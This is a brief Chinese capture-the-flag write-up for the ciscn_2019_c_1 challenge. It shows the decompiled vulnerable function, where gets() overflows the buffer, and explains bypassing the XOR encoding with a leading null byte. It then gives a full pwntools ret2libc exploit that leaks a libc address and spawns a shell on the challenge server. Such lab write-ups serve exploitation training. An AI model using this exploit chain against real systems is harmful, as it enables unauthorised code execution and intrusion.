考点：栈溢出、[[ret2libc]]

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

比较套路化，gets 是溢出点，比较烦人的是 encrypt 函数会对输入的 payload 进行加密，于是有两种思路：

1. 根据异或的可逆性，直接先对 payload 加密之后再发给程序；
2. `strlen` 可以被 `\x00` 截断，所以在 payload 第一个字节 padding 一个 `\x00` 就可以了。

显然第二种工作量小一些。程序没有 system 和 binsh，剩下的直接打就行。


```py
from pwn import *
from LibcSearcher import *

e = ELF('./ciscn_c_1')
offset = 0x50
enc_addr = 0x4009a0
pop_rdi = 0x400c83
retn = 0x400c84

payload1 = b'\x00' + b'A' * (offset-1) + p64(0xdeafbeef) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(enc_addr)
# p = process("./ciscn_2019_c_1")
p = remote('node5.buuoj.cn',28505)
p.sendline(b'1')
p.recv()
p.sendline(payload1)
p.recvuntil('Ciphertext\n\n')
s = p.recv(6)
puts_addr = u64(s.ljust(8,b'\x00'))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
sh_addr = libc_base + libc.dump('str_bin_sh')
sys_addr = libc_base + libc.dump('system')
payload2 = b'\x00' + b'A' * (offset-1) + p64(0xdeadbeef) + p64(retn) + p64(pop_rdi) + p64(sh_addr) +p64(sys_addr)
p.sendline(payload2)
p.interactive()
```